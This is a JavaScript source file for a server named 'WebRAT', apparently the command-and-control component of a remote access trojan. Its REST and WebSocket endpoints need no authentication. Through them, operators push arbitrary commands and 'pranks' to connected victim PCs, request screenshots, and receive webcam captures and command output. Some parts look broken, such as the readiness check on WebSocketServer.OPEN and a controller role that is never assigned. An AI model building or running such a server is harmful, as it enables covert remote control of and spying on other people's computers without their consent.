const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);

// WebSocket server on /ws path to avoid conflicts with Vite HMR
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Store connected clients
const clients = new Map();
const connectedPCs = new Map();

// WebSocket connection handling
wss.on('connection', (ws, req) => {
  const clientId = Math.random().toString(36).substring(7);
  const clientIP = req.socket.remoteAddress;
  
  console.log(`Client connected: ${clientId} from ${clientIP}`);
  
  clients.set(clientId, {
    ws,
    id: clientId,
    ip: clientIP,
    type: 'unknown',
    connectedAt: new Date(),
    lastPing: new Date()
  });

  // Send welcome message
  ws.send(JSON.stringify({
    type: 'welcome',
    clientId,
    message: 'Connected to WebRAT server'
  }));

  // Handle incoming messages
  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data.toString());
      handleWebSocketMessage(clientId, message);
    } catch (error) {
      console.error('Invalid JSON message:', error);
    }
  });

  // Handle client disconnect
  ws.on('close', () => {
    console.log(`Client disconnected: ${clientId}`);
    clients.delete(clientId);
    connectedPCs.delete(clientId);
    broadcastPCList();
  });

  // Handle WebSocket errors
  ws.on('error', (error) => {
    console.error(`WebSocket error for client ${clientId}:`, error);
  });
});

function handleWebSocketMessage(clientId, message) {
  const client = clients.get(clientId);
  if (!client) return;

  switch (message.type) {
    case 'register':
      // Register as a controlled PC
      client.type = 'pc';
      client.pcName = message.pcName || `PC-${clientId}`;
      client.osInfo = message.osInfo || {};
      
      connectedPCs.set(clientId, {
        id: clientId,
        name: client.pcName,
        ip: client.ip,
        status: 'connected',
        osInfo: client.osInfo,
        connectedAt: client.connectedAt
      });
      
      broadcastPCList();
      break;

    case 'ping':
      client.lastPing = new Date();
      client.ws.send(JSON.stringify({ type: 'pong' }));
      break;

    case 'command_result':
      // Broadcast command result to all controllers
      broadcastToControllers({
        type: 'command_result',
        pcId: clientId,
        command: message.command,
        result: message.result,
        timestamp: new Date()
      });
      break;

    case 'prank_result':
      // Broadcast prank execution result
      broadcastToControllers({
        type: 'prank_result',
        pcId: clientId,
        prankType: message.prankType,
        success: message.success,
        error: message.error,
        timestamp: new Date()
      });
      break;

    case 'screenshot':
      // Handle screenshot data
      broadcastToControllers({
        type: 'screenshot',
        pcId: clientId,
        imageData: message.imageData,
        timestamp: new Date()
      });
      break;

    case 'webcam_capture':
      // Handle webcam capture
      broadcastToControllers({
        type: 'webcam_capture',
        pcId: clientId,
        imageData: message.imageData,
        timestamp: new Date()
      });
      break;

    default:
      console.log(`Unknown message type: ${message.type}`);
  }
}

function broadcastToControllers(message) {
  clients.forEach((client) => {
    if (client.type === 'controller' && client.ws.readyState === WebSocketServer.OPEN) {
      client.ws.send(JSON.stringify(message));
    }
  });
}

function broadcastPCList() {
  const pcList = Array.from(connectedPCs.values());
  broadcastToControllers({
    type: 'pc_list_update',
    pcs: pcList
  });
}

// REST API Endpoints

// Get connected PCs
app.get('/api/pcs', (req, res) => {
  const pcs = Array.from(connectedPCs.values());
  res.json(pcs);
});

// Execute command on a PC
app.post('/api/pcs/:pcId/command', (req, res) => {
  const { pcId } = req.params;
  const { command } = req.body;
  
  const client = clients.get(pcId);
  if (!client || client.type !== 'pc') {
    return res.status(404).json({ error: 'PC not found or not connected' });
  }

  if (client.ws.readyState !== WebSocketServer.OPEN) {
    return res.status(503).json({ error: 'PC connection not ready' });
  }

  // Send command to PC
  client.ws.send(JSON.stringify({
    type: 'execute_command',
    command
  }));

  res.json({ 
    message: 'Command sent successfully',
    pcId,
    command
  });
});

// Execute prank on a PC
app.post('/api/pcs/:pcId/prank', (req, res) => {
  const { pcId } = req.params;
  const { prankType, parameters } = req.body;
  
  const client = clients.get(pcId);
  if (!client || client.type !== 'pc') {
    return res.status(404).json({ error: 'PC not found or not connected' });
  }

  if (client.ws.readyState !== WebSocketServer.OPEN) {
    return res.status(503).json({ error: 'PC connection not ready' });
  }

  // Send prank command to PC
  client.ws.send(JSON.stringify({
    type: 'execute_prank',
    prankType,
    parameters: parameters || {}
  }));

  res.json({ 
    message: 'Prank executed successfully',
    pcId,
    prankType
  });
});

// Request screenshot from PC
app.post('/api/pcs/:pcId/screenshot', (req, res) => {
  const { pcId } = req.params;
  
  const client = clients.get(pcId);
  if (!client || client.type !== 'pc') {
    return res.status(404).json({ error: 'PC not found or not connected' });
  }

  if (client.ws.readyState !== WebSocketServer.OPEN) {
    return res.status(503).json({ error: 'PC connection not ready' });
  }

  // Request screenshot from PC
  client.ws.send(JSON.stringify({
    type: 'take_screenshot'
  }));

  res.json({ 
    message: 'Screenshot requested',
    pcId
  });
});

// Get server statistics
app.get('/api/stats', (req, res) => {
  const stats = {
    totalClients: clients.size,
    connectedPCs: connectedPCs.size,
    controllers: Array.from(clients.values()).filter(c => c.type === 'controller').length,
    uptime: process.uptime(),
    serverTime: new Date()
  };
  
  res.json(stats);
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date(),
    version: '1.0.0'
  });
});

// Serve the main HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebRAT Server running on port ${PORT}`);
  console.log(`WebSocket server available at ws://localhost:${PORT}/ws`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

module.exports = app;
